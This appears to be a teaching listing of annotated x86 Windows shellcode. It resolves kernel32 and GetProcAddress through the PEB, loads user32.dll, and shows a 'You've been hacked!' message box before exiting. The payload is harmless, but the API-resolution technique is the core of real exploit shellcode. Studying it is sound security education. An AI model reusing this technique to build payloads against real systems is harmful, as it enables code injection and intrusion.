
Section 1: Set up a new stack frame

		0:  31 c0                   xor    eax,eax								// Set eax to zero
		1:  64 8b 60 08             mov    esp, fs:[eax+0x8]			// Move Segment:Offset(base) to esp
		2:  8d 2c 24                lea    ebp,[esp]							// Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find kernel32.dll base address

		3:  31 c0                  xor    eax,eax								// EAX = 0
		4:  64 8b 58 30            mov    ebx, fs:[eax+0x30]			// EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
		5:  8b 5b 0c               mov    ebx, [ebx+0xc]					// EBX = PEB_LDR_DATA // using offset 0xc
		6: 8b 5b 14                mov    ebx, [ebx+0x14]				// EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
		7: 8b 1b                   mov    ebx, [ebx]							// EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
		8: 8b 1b                   mov    ebx, [ebx]							// EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
		9: 8b 5b 10                mov    ebx, [ebx+0x10]				// EBX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Get address of GetProcAddress

		10: 8b 53 3c                mov    edx, [ebx+0x3c]				// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
		11: 01 da                   add    edx,ebx								// EDX = Address of PE signature = base address + RVA of PE signature
		12: 8b 52 78                mov    edx, [edx+0x78]				// EDX = RVA of Export Table = Address of PE + offset 0x78
		13: 01 da                   add    edx,ebx								// EDX = Address of Export Table = base address + RVA of export table
		14: 8b 72 20                mov    esi, [edx+0x20]				// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
		15: 01 de                   add    esi,ebx								// ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
		16: 31 c9                   xor    ecx,ecx								// ECX = 0

	loopSearch:
		17: 41                      inc    ecx												// Increment Counter
		18: ad                      lods	 eax,DWORD PTR ds:[esi]			// Load next entry in list into EAX
		19: 01 d8                   add    eax,ebx										// EAX = Address of entry = base address + Address of Entry
		20: 81 38 47 65 74 50       cmp    dword [eax],0x50746547			// Compare first byte to GetP
		21: 75 f4                   jne    loopSearch									// Start over if not equal
		22: 81 78 04 72 6f 63 41    cmp    dword [eax+0x4],0x41636f72 // Compare second byte to rocA
		23: 75 eb                   jne    loopSearch									// Start over if not equal

	getProcAddressFunc:
		24: 8b 7a 24                mov    edi, [edx+0x24] 						// EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
		25: 01 df                   add    edi,ebx										// EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
		26: 66 8b 0c 4f             mov    cx, [edi+ecx*2]						// CX = Number of Function = Address of Ordinal Table + Counter * 2
		27: 49                      dec    ecx												// Decrement ECX (As name ordinals starts from 0)
		28: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]		// EDI = RVA of AddressOfFunctions
		29: 01 df                   add    edi,ebx										// EDI = AddressOfFunctions
		30: 8b 3c 8f                mov    edi,DWORD PTR [edi+ecx*4]	// EDI = Pointer to required function (ECX * 4 because each pointer has 4 bytes)
		31: 01 df                   add    edi,ebx										// EDI = getProcAddress = base address + Pointer to required function

Section 4: Use LoadLibrary to load user32.dll

	getLoadLibraryA:
		32: 31 c9                   xor    ecx,ecx										// ECX = 0
		33: 51                      push   ecx												// Push ECX onto stack
		34: 68 61 72 79 41          push   0x41797261									//
		35: 68 4c 69 62 72          push   0x7262694c									// AyrarbiLdaoL
		36: 68 4c 6f 61 64          push   0x64616f4c									//
		37: 54                      push   esp												// "LoadLibraryA"
		38: 53                      push   ebx												// "Kernel32.dll"
		39: ff d7                   call   edi												// GetProcAddress(Kernel32.dll,LoadLibraryA)

	getUser32:
		40: 68 6c 6c 61 61          push   0x61616c6c									// aall
		41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161	// Remove additional characters "aa"
		42: 68 33 32 2e 64          push   0x642e3233									// d.32
		43: 68 55 73 65 72          push   0x72657355									// resU
		44: 54                      push   esp												// "User32.dll"
		45: ff d0                   call   eax												// Call LoadLibrary(User32.dll)

Section 5: Use GetProcAddress to find the address of MessageBox

	getMessageBox:
		46: 68 6f 78 41 61          push   0x6141786f									// aAxo
		47: 66 83 6c 24 03 61       sub    WORD PTR [esp+0x3],0x61		// Remove additional character "a"
		48: 68 61 67 65 42          push   0x42656761									// Bega
		49: 68 4d 65 73 73          push   0x7373654d									// sseM
		50: 54                      push   esp												// "MessageBoxA"
		51: 50                      push   eax												// "User.dll"
		52: ff d7                   call   edi												// GetProcAddress(User32.dll,MessageBoxA)

Section 6: Specify the function parameters

	MessageBoxA:
		53: 83 c4 10                add    esp,0x10										// Clean the stack
		54: 31 d2                   xor    edx,edx										// EDX = 0
    55: 52                      push   edx												// Push NULL
    56: 68 6c 6f 69 74          push   0x74696f6c									// ...
    57: 68 20 45 78 70          push   0x70784520									// ...
    58: 68 6f 78 20 2d          push   0x2d20786f									// ...
    59: 68 4d 73 67 42          push   0x4267734d									// "MsgBox - Exploit"
    60: 89 e6                   mov    esi,esp										// ESI = Title
    61: 52                      push   edx												// Push terminating byte
  	62: 68 6b 65 64 21          push   0x2164656b									// ...
    63: 68 20 68 61 63          push   0x63616820									// ...
    64: 68 62 65 65 6e          push   0x6e656562									// ...
    65: 68 27 76 65 20          push   0x20657627									// ...
    66: 68 20 59 6f 75          push   0x756f5920									// "You've been hacked!"
 		67: 89 e1                   mov    ecx,esp										// ECX = Message

Section 7: Call the function

		68: 6a 11                   push   0x11												// Push Type (MB_OKCANCEL|MB_ICONWARNING)
		69: 56                      push   esi												// Push Title
		70: 51                      push   ecx												// Push Message
		71: 52                      push   edx												// Push NULL for windowhandle
		72: ff d0                   call   eax												// MessageBoxA(windowhandle,msg,title,type)

Section 9: Exit Safely

		 73: 68 65 73 73 61           push   0x61737365               // asse
		 74: 66 83 6c 24 03 61        sub    WORD PTR [esp+0x3],0x61  // Remove the "a"
		 75: 68 50 72 6f 63           push   0x636f7250               // corP
		 76: 68 45 78 69 74           push   0x74697845               // tixE
		 77: 54                       push   esp                      // "ExitProcess"
		 78: 53                       push   ebx                      // "Kernel32.dll"
		 79: ff d7                    call   edi                      // GetProcAddress(Kernel32.dll, ExitProcess)
		 80: 31 c9                    xor    ecx,ecx                  // ECX = 0
		 81: 51                       push   ecx                      // Push 0
		 82: ff d0                    call   eax                      // ExitProcess(0)
